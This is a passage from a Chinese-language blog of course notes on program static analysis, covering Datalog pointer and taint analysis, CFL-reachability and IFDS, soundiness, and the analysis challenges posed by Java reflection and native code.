<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VarPointsTo(r, o) &lt;- CallGraph(l, m),MethodReturn(m, ret),VarPointsTo(ret, o),CallReturn(l, r).</span><br></pre></td></tr></table></div></figure>

<p>最终结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311154015447.png" alt="aaaaa"></p>

        <h3 id="实例-7"   >
          <a href="#实例-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-7" class="headerlink" title="实例"></a>实例</h3>
      
        <h4 id="EDB-1"   >
          <a href="#EDB-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#EDB-1" class="headerlink" title="EDB"></a>EDB</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311113001636.png" alt="image-20230311113001636"></p>
<p>依据上述的例子能大概推导出相关的<code>EDB</code>了。</p>

        <h4 id="Rules-4"   >
          <a href="#Rules-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-4" class="headerlink" title="Rules"></a>Rules</h4>
      <p>依据规则进行一一解析即可求得</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311114532642.png" alt="image-20230311114532642"></p>

        <h4 id="Whole-Program-Pointer-Analysis"   >
          <a href="#Whole-Program-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Whole-Program-Pointer-Analysis" class="headerlink" title="Whole-Program Pointer Analysis"></a>Whole-Program Pointer Analysis</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311154150284.png" alt="image-20230311154150284"></p>
<p>处理<code>New</code>方法时，会限定在<code>reachable</code>方法中</p>

        <h2 id="4-Taint-Analysis-via-Datalog"   >
          <a href="#4-Taint-Analysis-via-Datalog" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Taint-Analysis-via-Datalog" class="headerlink" title="4.Taint Analysis via Datalog"></a>4.Taint Analysis via Datalog</h2>
      
        <h3 id="相关概念-1"   >
          <a href="#相关概念-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关概念-1" class="headerlink" title="相关概念"></a>相关概念</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311154838944.png" alt="image-20230311154838944"></p>
<p>主要是<code>Taint(l:S,t:T)</code>的解释，把所有的污点数据产生点<code>call site</code>，即<code>l:S</code>关联到产生的污点数据<code>tainted data</code>，即<code>t:T</code>。<code>TaintFlow</code>差不多是相同的。</p>

        <h4 id="source-sink"   >
          <a href="#source-sink" class="heading-link"><i class="fas fa-link"></i></a><a href="#source-sink" class="headerlink" title="source/sink"></a>source/sink</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314102251546.png" alt="image-20230314102251546"></p>
<p>同样是一一对应的关系，即在指针分析中加入这个污点分析即可。</p>

        <h3 id="优缺点"   >
          <a href="#优缺点" class="heading-link"><i class="fas fa-link"></i></a><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314103528905.png" alt="image-20230314103528905"></p>

        <h4 id="优点Pros"   >
          <a href="#优点Pros" class="heading-link"><i class="fas fa-link"></i></a><a href="#优点Pros" class="headerlink" title="优点Pros"></a>优点Pros</h4>
      <p>比较整洁，容易实现，更容易基于现成的引擎优化进行改造</p>

        <h4 id="缺点Cons"   >
          <a href="#缺点Cons" class="heading-link"><i class="fas fa-link"></i></a><a href="#缺点Cons" class="headerlink" title="缺点Cons"></a>缺点Cons</h4>
      <p>因为<code>Datalog</code>的一些限制，导致其表达方式比较少，某些逻辑可能不能表达到位，比如一些<code>for-all</code>的情况等。此外<code>Datalog</code>因为大多基于一些引擎，导致其不能很好地控制性能。</p>

        <h2 id="总结-8"   >
          <a href="#总结-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314104032554.png" alt="image-20230314104032554"></p>
<p>了解<code>Datalog</code>语言，学会通过<code>Datalog</code>实现指针分析、污点分析。</p>

        <h1 id="十四、CFL-Reachability-and-IFDS"   >
          <a href="#十四、CFL-Reachability-and-IFDS" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、CFL-Reachability-and-IFDS" class="headerlink" title="十四、CFL-Reachability and IFDS"></a>十四、CFL-Reachability and IFDS</h1>
      
        <h2 id="1-Feasible-and-Realizable-Paths"   >
          <a href="#1-Feasible-and-Realizable-Paths" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Feasible-and-Realizable-Paths" class="headerlink" title="1.Feasible and Realizable Paths"></a>1.Feasible and Realizable Paths</h2>
      
        <h3 id="Infeasible-Paths"   >
          <a href="#Infeasible-Paths" class="heading-link"><i class="fas fa-link"></i></a><a href="#Infeasible-Paths" class="headerlink" title="Infeasible Paths:"></a>Infeasible Paths:</h3>
      <p><code>CFG</code>中在程序运行起来并不执行的路径</p>

        <h3 id="Realizable-Paths"   >
          <a href="#Realizable-Paths" class="heading-link"><i class="fas fa-link"></i></a><a href="#Realizable-Paths" class="headerlink" title="Realizable Paths:"></a>Realizable Paths:</h3>
      <p><code>call</code>和<code>return</code>相匹配的路径，即分析的时候不会依据函数传递到其他的变量，如下的调用点<code>1</code>和调用点<code>2</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314145313166.png" alt="image-20230314145313166"></p>
<p>但是<code>Readlizabale path</code>其实也可能不被执行，因为可能该<code>Readlizabale path</code>的调用点是在<code>Infeasible Paths</code>中。另外<code>unrealizable paths</code>一定不会被执行。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314145241336.png" alt="image-20230314145241336"></p>

        <h2 id="2-CFL-Reachability"   >
          <a href="#2-CFL-Reachability" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-CFL-Reachability" class="headerlink" title="2.CFL-Reachability"></a>2.CFL-Reachability</h2>
      <p>一条<code>A</code>到<code>B</code>的路径中所有的边都有一个<code>label</code>，这个<code>lable</code>只能由确定的规则<code>context-free language</code>来定义</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314145614781.png" alt="image-20230314145614781"></p>
<ul>
<li><p><code>context-free language</code> : 遵循<code>context-free grammar(CFG)</code>的语言</p>
</li>
<li><p><code>context-free grammar(CFG)</code> : </p>
<p>有点不理解，<code>Mark</code>一下</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314193506350.png" alt="image-20230314193506350"></p>
<p>感觉就是一个加了标签的括号匹配算法，满足这个情况即是<code>realizable</code></p>

        <h2 id="3-Overview-of-IFDS"   >
          <a href="#3-Overview-of-IFDS" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Overview-of-IFDS" class="headerlink" title="3.Overview of IFDS"></a>3.Overview of IFDS</h2>
      
        <h3 id="概念-1"   >
          <a href="#概念-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314202708702.png" alt="image-20230314202708702"></p>
<p>在过程间数据流分析中，如果一个<code>f</code>是可分配<code>distributive</code>，并且其<code>domains</code>是<code>finite</code>的，那么就可以用<code>IFDS</code></p>

        <h3 id="Meet-Over-All-Realizable-Paths-MRP"   >
          <a href="#Meet-Over-All-Realizable-Paths-MRP" class="heading-link"><i class="fas fa-link"></i></a><a href="#Meet-Over-All-Realizable-Paths-MRP" class="headerlink" title="Meet-Over-All-Realizable-Paths (MRP)"></a>Meet-Over-All-Realizable-Paths (MRP)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314203137454.png" alt="image-20230314203137454"></p>
<p>即在<code>realizable paths</code>上做<code>MOP</code>分析，更加准确</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316101950460.png" alt="image-20230316101950460"></p>
<p>这里属实听得不太懂</p>

        <h3 id="Supergraph"   >
          <a href="#Supergraph" class="heading-link"><i class="fas fa-link"></i></a><a href="#Supergraph" class="headerlink" title="Supergraph"></a>Supergraph</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316102200598.png" alt="image-20230316102200598"></p>
<ul>
<li><code>G* = (N* , E*)</code> : 即每个函数都有自己的<code>FG(flowgraph)</code>，这里的例子即为<code>G_main/G_p</code>，而<code>G_main</code>加上<code>G_p</code>一起组成了整个程序的<code>G*</code>。</li>
<li>每个函数的<code>FG</code>中都会有<code>s_p</code>入口，以及<code>e_p</code>出口。此外对于函数调用的实现用<code>call_p/ret_p</code>来体现。</li>
</ul>

        <h4 id="G"   >
          <a href="#G" class="heading-link"><i class="fas fa-link"></i></a><a href="#G" class="headerlink" title="G*"></a>G*</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316102726071.png" alt="image-20230316102726071"></p>
<p>在每个程序调用中都有三种不同的边</p>
<ul>
<li><code>call-to-return-site edge</code> : 图中紫色的边，<code>Call_p-&gt;Ret_P</code>，在当前函数中。</li>
<li><code>call-to-start edge</code> : 图中绿色的边，<code>Call_p-&gt;S_p</code>，在不同函数中</li>
<li><code>exit-to-return-site edge</code> : 图中深蓝色的边，<code>e_p-&gt;Ret_p</code>，在函数返回时跳转到调用点</li>
</ul>

        <h4 id="Design-Flow-Functions"   >
          <a href="#Design-Flow-Functions" class="heading-link"><i class="fas fa-link"></i></a><a href="#Design-Flow-Functions" class="headerlink" title="Design Flow Functions"></a>Design Flow Functions</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316103727673.png" alt="image-20230316103727673"></p>
<ul>
<li><code>N*</code> : 程序中在没有实际运行前可能没有被初始化的变量</li>
<li><code>λ e_param.e_body</code> : 想想成一个匿名函数，<code>λ</code>为函数名，<code>e_param</code>为函数参数，<code>e_body</code>为函数体，相关的例子如上。</li>
</ul>

        <h5 id="例子-6"   >
          <a href="#例子-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-6" class="headerlink" title="例子"></a>例子</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316104651630.png" alt="image-20230316104651630"></p>
<ul>
<li><p>首先将未被初始化的变量加入集合<code>S</code> : <code>λ S.&#123;x,g&#125;</code></p>
</li>
<li><p><code>x=0 -&gt; Call_p</code> : 代表<code>x</code>被初始化了，那么需要从集合<code>s</code>中减去<code>x</code>，即为<code>λ S.S-&#123;x&#125;</code></p>
</li>
<li><p><code>Call_p -&gt; S_p</code> : 发生了函数调用，相关参数的值发生传递，即将集合<code>s</code>中所有<code>x</code>替换成<code>a</code>，即为<code>λ S.S</code></p>
</li>
<li><p><code>a=a-g -&gt; Call_p</code> : 当<code>a</code>或者<code>g</code>任意一个变量没有被初始化，那么<code>a</code>就没有被初始化，那么就将<code>a</code>并入到集合<code>s</code>，即为<code>S ∪ &#123;a&#125; </code>。反之，<code>a/g</code>都被初始化了，就代表<code>a</code>也会被初始化，那么就需要从集合<code>s</code>中减去<code>a</code>，即为<code>S - &#123;a&#125;</code></p>
</li>
<li><p><code>Call_p -&gt; Ret_p</code> : </p>
<p>主要考虑两个情况</p>
<ul>
<li>在函数中被初始化了，那么传回来的<code>S</code>中就不会包含<code>g</code>，<code>S-&#123;g&#125;</code>也不包含<code>g</code>，两者相合不包含<code>g</code>，准确</li>
<li>在函数中没有被初始化，那么传回来的<code>S</code>中包含<code>g</code>，<code>S-&#123;g&#125;</code>不包含<code>g</code>，两者相合包含<code>g</code>，准确</li>
</ul>
<p>同样的如果不是<code>S-&#123;g&#125;</code>，那么情况如下</p>
<ul>
<li>在函数中被初始化了，那么传回来的<code>S</code>中就不会包含<code>g</code>，<code>S</code>包含<code>g</code>，两者相合包含<code>g</code>，不准确</li>
<li>在函数中没有被初始化，那么传回来的<code>S</code>中包含<code>g</code>，<code>S</code>包含<code>g</code>，两者相合包含<code>g</code>，准确</li>
</ul>
<p>这样<code>S-&#123;g&#125;</code>就会更加准确</p>
</li>
<li><p><code>e_p -&gt; Ret_p</code> : 发生了函数返回，需要减去本地变量，即为<code>λ S.S-&#123;a&#125;</code></p>
</li>
</ul>

        <h3 id="Exploded-Supergraph"   >
          <a href="#Exploded-Supergraph" class="heading-link"><i class="fas fa-link"></i></a><a href="#Exploded-Supergraph" class="headerlink" title="Exploded Supergraph"></a>Exploded Supergraph</h3>
      
        <h4 id="概念-2"   >
          <a href="#概念-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#概念-2" class="headerlink" title="概念"></a>概念</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316113507233.png" alt="image-20230316113507233"></p>
<ul>
<li>需要建立一个<code>representation relations (graphs)</code></li>
<li>每一个<code>flow function</code>都可以被表示成<code>2(D+1)</code>个节点的关系连边，<code>D</code>是<code>dataflow facts</code>的集合</li>
</ul>

        <h4 id="Rule规则"   >
          <a href="#Rule规则" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule规则" class="headerlink" title="Rule规则"></a>Rule规则</h4>
      <ul>
<li><code>0-&gt;0</code> : 无条件存在</li>
<li><code>0-&gt;x</code> : 即无条件产生了<code>x</code></li>
<li><code>x-&gt;y</code> : 即在有<code>x</code>的情况下，会产生<code>y</code></li>
</ul>
<p>大概依据上图可以判断一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316114330648.png" alt="image-20230316114330648"></p>
<p>最终需要依据规则，将<code>G*</code>转化为<code>G#</code></p>

        <h4 id="Why-We-Need-Edge-0-⟶-0"   >
          <a href="#Why-We-Need-Edge-0-⟶-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#Why-We-Need-Edge-0-⟶-0" class="headerlink" title="Why We Need Edge 0 ⟶ 0?"></a>Why We Need Edge 0 ⟶ 0?</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316121445007.png" alt="image-20230316121445007"></p>
<p>即需要<code>0-&gt;0</code>的边来在某点产生新的变量，使得传递<code>reach</code>成立，否则就没办法表达能够<code>reach</code>的概念，那么加入<code>0-&gt;0</code>如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316121607565.png" alt="image-20230316121607565"></p>

        <h4 id="例子-7"   >
          <a href="#例子-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-7" class="headerlink" title="例子"></a>例子</h4>
      <p>依据相关规则得到如下结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316121704079.png" alt="image-20230316121704079"></p>
<p>这个应该不难得到，通过这个图即可判断一些变量是否可达，比如下图画圈的<code>g</code>点就在<code>realizable paths</code>中可达</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316154149995.png" alt="image-20230316154149995"></p>
<p>而下图画圈的<code>g</code>点只会在<code>non-realizable paths</code>中可达，因为该路径括号其实是不匹配的。</p>
<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20230316154211337.png" alt="image-20230316154211337"></p>

        <h3 id="Tabulation-Algorithm"   >
          <a href="#Tabulation-Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tabulation-Algorithm" class="headerlink" title="Tabulation Algorithm"></a>Tabulation Algorithm</h3>
      <p>依据<code>G#</code>，通过该算法寻找<code>realizable paths</code>寻找变量可达路径。该算法比较复杂，课程进行了简单介绍。具体算法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316193520580.png" alt="image-20230316193520580"></p>
<p>看到<code>bsauce</code>师傅写的真好：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/148255285" >【课程笔记】南大软件分析课程11——CFL可达性&amp;IFDS（课时15） - 知乎 (zhihu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li>时间复杂度O(ED^3)</li>
</ul>

        <h4 id="Core-Working-Mechanism-of-Tabulation-Algorithm"   >
          <a href="#Core-Working-Mechanism-of-Tabulation-Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#Core-Working-Mechanism-of-Tabulation-Algorithm" class="headerlink" title="Core Working Mechanism of Tabulation Algorithm"></a>Core Working Mechanism of Tabulation Algorithm</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316192306135.png" alt="image-20230316192306135"></p>
<p>即依照给的顺序依次进行<code>reach</code>可达探测，但是完成<code>Four</code>之后，再碰到<code>Five</code>，就直接进行连边了，因为<code>Two</code>已经进行探测了，不需要再计算一遍了。</p>

        <h2 id="4-Understanding-the-Distributivity-of-IFDS"   >
          <a href="#4-Understanding-the-Distributivity-of-IFDS" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Understanding-the-Distributivity-of-IFDS" class="headerlink" title="4.Understanding the Distributivity of IFDS"></a>4.Understanding the Distributivity of IFDS</h2>
      <p>帮助判断该问题是否可用<code>IFDS</code>来解决</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317100320870.png" alt="image-20230317100320870"></p>
<p>不可以用标准的<code>IFDS</code>来解决这两个问题</p>

        <h3 id="Distributivity"   >
          <a href="#Distributivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Distributivity" class="headerlink" title="Distributivity"></a>Distributivity</h3>
      <p>常见的分配律</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317100927589.png" alt="image-20230317100927589"></p>

        <h3 id="Constant-Propagation"   >
          <a href="#Constant-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Constant-Propagation" class="headerlink" title="Constant Propagation"></a>Constant Propagation</h3>
      <p>但是对于<code>Constant Propagation</code>，该语句中的<code>z</code>的结果依赖于<code>x/y</code>共同的结果，并不能单独处理之后得到结果，无法满足分配律。这里其实就有点不懂了，比如之前提到的如下情况，不也是处理两个输入吗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317105418025.png" alt="image-20230317105418025"></p>
<p>有点不太理解，mark一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317101652497.png" alt="image-20230317101652497"></p>
<ul>
<li>当一个语句需要考虑多种输入数据才能得到正确结果时，就不是<code>distributive</code>可分配的，不能用<code>IFDS</code></li>
<li>在<code>IFDS</code>中，所有的数据以及传播都需可以被单独处理，这些单独处理并不会导致最终结果的正确性发生改变。</li>
<li><code>IFDS</code>一次<code>f</code>只能处理一个<code>data input</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317102104425.png" alt="image-20230317102104425"></p>
<p>比如上述语句<code>y = 2x + 3</code>可以用<code>IFDS</code>来进行常量传播分析</p>

        <h3 id="Pointer-Analysis"   >
          <a href="#Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pointer-Analysis" class="headerlink" title="Pointer Analysis"></a>Pointer Analysis</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317102902311.png" alt="image-20230317102902311"></p>
<p>这个分析中，最开始分析没有图中红线部分，需要添加一个别名信息才可以<code>alias</code>，即<code>y=x</code>这个情况，但是需要别名信息的话，又要处理多个输入<code>x/y</code>，所以不能用<code>IFDS</code></p>

        <h2 id="总结-9"   >
          <a href="#总结-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-9" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317110045113.png" alt="image-20230317110045113"></p>
<p>理解<code>CFL-Reachability</code>(括号匹配问题)，基础的<code>IFDS</code>，以及什么问题可以用<code>IFDS</code>进行解决</p>

        <h1 id="十五、Soundness-and-Soundiness"   >
          <a href="#十五、Soundness-and-Soundiness" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、Soundness-and-Soundiness" class="headerlink" title="十五、Soundness and Soundiness"></a>十五、Soundness and Soundiness</h1>
      
        <h2 id="1-Soundness-and-Soundiness"   >
          <a href="#1-Soundness-and-Soundiness" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Soundness-and-Soundiness" class="headerlink" title="1.Soundness and Soundiness"></a>1.Soundness and Soundiness</h2>
      
        <h3 id="Soundness"   >
          <a href="#Soundness" class="heading-link"><i class="fas fa-link"></i></a><a href="#Soundness" class="headerlink" title="Soundness"></a>Soundness</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317115113287.png" alt="image-20230317115113287"></p>
<p>可以分析程序所有可能的执行结果，包括动态运行的，称为<code>Sound</code>。但是无论学术界还是工业界中，基本都是<code>UnSound</code>，即无法分析到程序所有可能的执行结果。</p>

        <h3 id="Hard-Language-Features-for-Static-Analysis"   >
          <a href="#Hard-Language-Features-for-Static-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hard-Language-Features-for-Static-Analysis" class="headerlink" title="Hard Language Features for Static Analysis"></a>Hard Language Features for Static Analysis</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318104624160.png" alt="image-20230318104624160"></p>
<p>即一些比较难以进行程序分析的语言。</p>
<p>有的分析研究希望能够寻找到一个保守估计的结果进行分析，比如<code>C/C++</code>里面的<code>Point</code>的地址进行加减的时候，就将该整个块当作指针可能的结果进行分析，但是也会相当不准确。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318104906691.png" alt="image-20230318104906691"></p>
<p>大部分的研究说分析是<code>Sound</code>的，其实都不是<code>Sound</code>，这些都会造成一些误导，导致过分依赖这个分析。</p>

        <h3 id="Soundiness"   >
          <a href="#Soundiness" class="heading-link"><i class="fas fa-link"></i></a><a href="#Soundiness" class="headerlink" title="Soundiness"></a>Soundiness</h3>
      <p>2015年是一些学者出来呼吁说程序分析的研究要标注<code>Soundiness</code>。即在发表的研究结果中，某些难以分析的部分需要充分说明，并且标注<code>Soundy</code>，表示告诉读者这部分在努力实现<code>Sound</code>，但是也不一定能够达到<code>Sound</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318110806642.png" alt="image-20230318110806642"></p>

        <h3 id="对比"   >
          <a href="#对比" class="heading-link"><i class="fas fa-link"></i></a><a href="#对比" class="headerlink" title="对比"></a>对比</h3>
      <p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20230318110826465.png" alt="image-20230318110826465"></p>
<ul>
<li><code>Sound</code> : 比较理想化，能够处理程序所有可能的运行结果</li>
<li><code>Soundy</code> : 企图处理程序所有可能的运行结果，但在<code>hard language features</code>可以是<code>unsound</code>的，进行大概处理。</li>
<li><code>Unsound</code> : 为了相关的精度、效率等故意不处理某些部分。</li>
</ul>

        <h2 id="2-Hard-Language-Feature-Java-Reflection"   >
          <a href="#2-Hard-Language-Feature-Java-Reflection" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Hard-Language-Feature-Java-Reflection" class="headerlink" title="2.Hard Language Feature: Java Reflection"></a>2.Hard Language Feature: Java Reflection</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318111512158.png" alt="image-20230318111512158"></p>
<p>对于程序分析而言，<code>JAVA reflection</code>使得分析<code>JAVA</code>变得很困难</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318111619066.png" alt="image-20230318111619066"></p>

        <h3 id="Java-Reflection"   >
          <a href="#Java-Reflection" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3>
      <p>这个可以参考一下<code>p</code>神讲的</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings" >GitHub - phith0n/JavaThings: Share Things Related to Java - Java安全漫谈笔记相关内容</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318111949117.png" alt="image-20230318111949117"></p>
<p>即利用反射相关<code>API</code>来获取<code>JAVA</code>中类，然后通过类创建对象，获取属性，修改属性等，这里讲得听清楚的。</p>

        <h3 id="Why-We-Need-to-Analyze-Java-Reflection"   >
          <a href="#Why-We-Need-to-Analyze-Java-Reflection" class="heading-link"><i class="fas fa-link"></i></a><a href="#Why-We-Need-to-Analyze-Java-Reflection" class="headerlink" title="Why We Need to Analyze Java Reflection?"></a>Why We Need to Analyze Java Reflection?</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318112836799.png" alt="image-20230318112836799"></p>
<p>依据之前学到的指针分析，其实在分析的时候，不一定能检测出来该指针指向的是哪个对象，也可能分析出来指向多个对象。那么当调用到<code>m.invoke</code>这种反射里面常见的<code>API</code>时，由于<code>m</code>解析不正确，那么就会导致<code>m.invoke</code>没办法正常调用，就会出现<code>bug</code>。</p>
<p>或者在另一个例子中，两条流向会使得<code>a.fld</code>指向两个对象，那么就会导致<code>B b’ = (B) a.fld;</code>的<code>cast</code>发生错误。</p>

        <h3 id="How-to-Analyze-Java-Reflection"   >
          <a href="#How-to-Analyze-Java-Reflection" class="heading-link"><i class="fas fa-link"></i></a><a href="#How-to-Analyze-Java-Reflection" class="headerlink" title="How to Analyze Java Reflection?"></a>How to Analyze Java Reflection?</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318113227337.png" alt="image-20230318113227337"></p>

        <h4 id="String-Constant-Analysis-Pointer-Analysis"   >
          <a href="#String-Constant-Analysis-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#String-Constant-Analysis-Pointer-Analysis" class="headerlink" title="String Constant Analysis/Pointer Analysis"></a>String Constant Analysis/Pointer Analysis</h4>
      <p>从<code>05</code>年开始出现一种方法。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318113708808.png" alt="image-20230318113708808"></p>
<p>如果在反射中，相关的字符串通过<code>String Constant Analysis</code>可以求得，那么即可进行相关解析。但是如果没办法求得的时候，比如旁边黄色框列出来的部分，就没办法进行反射解析了。</p>

        <h4 id="Type-Inference-String-analysis-Pointer-Analysis"   >
          <a href="#Type-Inference-String-analysis-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Type-Inference-String-analysis-Pointer-Analysis" class="headerlink" title="Type Inference/String analysis/Pointer Analysis"></a>Type Inference/String analysis/Pointer Analysis</h4>
      <p>14年出现另一个方法，即老师们提出的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318114007467.png" alt="image-20230318114007467"></p>
<p>概括如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318114151787.png" alt="image-20230318114151787"></p>
<p>即使用该反射的时候可进行解析</p>
<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20230318115246794.png" alt="image-20230318115246794"></p>
<p>在该例子中，由于函数名是<code>_</code>加上<code>CMD</code>确定的，所以无法准确解析到对应的函数。</p>
<p>观察函数调用点<code>175</code>行，可以看到其<code>parameters</code>是个<code>Object[]</code>数组，那么这里创建的<code>Object[]</code>数组其类型必定在<code>JAVA</code>导入包中某些类，比如这里的<code>FrameworkCommandInterpreter</code>，是其<code>sub/supertypes</code>子类或者父类。</p>
<p>依据这个信息，在<code>JAVA</code>类型系统中寻找匹配相关的函数，会找出来很多函数，在该例子中，有50个函数被找到，其中48个函数都是可能会被调用的，即<code>true</code>。</p>
<p>这方面的最新研究也是老师们的研究最前沿</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318115926089.png" alt="image-20230318115926089"></p>
<p>求解到的反射对象更准确更多，并且可以说出哪里解的不准。</p>

        <h4 id="Assisted-by-Dynamic-Analysis"   >
          <a href="#Assisted-by-Dynamic-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Assisted-by-Dynamic-Analysis" class="headerlink" title="Assisted by Dynamic Analysis"></a>Assisted by Dynamic Analysis</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318120030439.png" alt="image-20230318120030439"></p>
<p>利用动态分析来求解，比如上面的<code>cmd</code>，将之用一个模糊用例进行动态执行，类似现今很流行的模糊测试，当匹配用例上证明就可能会调用到。</p>
<p>优点是求解出来的一定是准确的，因为必定是可能调用到的。</p>
<p>缺点就是常见的模糊测试的缺点，覆盖路径有限，比较慢。</p>

        <h2 id="3-Hard-Language-Feature-Native-Code"   >
          <a href="#3-Hard-Language-Feature-Native-Code" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Hard-Language-Feature-Native-Code" class="headerlink" title="3.Hard Language Feature: Native Code"></a>3.Hard Language Feature: Native Code</h2>
      
        <h3 id="Native-Code"   >
          <a href="#Native-Code" class="heading-link"><i class="fas fa-link"></i></a><a href="#Native-Code" class="headerlink" title="Native Code"></a>Native Code</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318155627496.png" alt="image-20230318155627496"></p>
<p><code>JAVA</code>代码从头往下的相关函数调用，其中相关的动态链接库中的代码就是<code>Native Code</code>，用<code>IDA</code>打开即为相关的汇编代码，可以直接运行在对应的操作系统<code>CPU</code>上的。但是在下面的分析中，还是看它的源代码形式，比如<code>C/C++</code>形式。</p>

        <h3 id="Java-Native-Interface-JNI"   >
